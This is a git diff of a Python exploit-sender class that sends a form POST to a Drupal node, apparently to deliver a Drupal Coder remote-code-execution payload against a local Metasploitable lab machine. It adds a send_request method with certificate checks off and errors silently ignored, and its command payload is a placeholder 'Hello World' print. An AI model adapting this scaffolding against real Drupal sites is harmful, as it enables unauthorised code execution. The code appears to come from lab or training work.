@@ -7,6 +7,7 @@ from base64 import b64encode
 class BeachheadSender:
 
     c_and_c = '\'print(\"Hello World\")\''
+    request = None
 
     def __init__(self):
         self.exploit = DrupalCoderExec()
@@ -43,9 +44,18 @@ class BeachheadSender:
         data += '&menu%5Bweight%5D=0&log=&path%5Balias%5D=&comment=1&name=metasploitable&date='
         data += '&status=1&additional_settings__active_tab=edit-menu&op=Save'
         
-        return requests.post(url=url, headers=headers, params=params, data=data)
+        self.request = requests.Request('POST', url=url, headers=headers, params=params, data=data)
+    
+    def send_request(self) -> requests.models.Response:
+        s = requests.Session()
+        try:
+            prepped = s.prepare_request(self.request)
+            s.send(prepped, verify=False)
+        except requests.exceptions.ConnectionError:
+            pass
 
 
 if __name__ == "__main__":
     sender = BeachheadSender()
     sender.create_request('127.0.0.1', '8082', '')
+    sender.send_request()
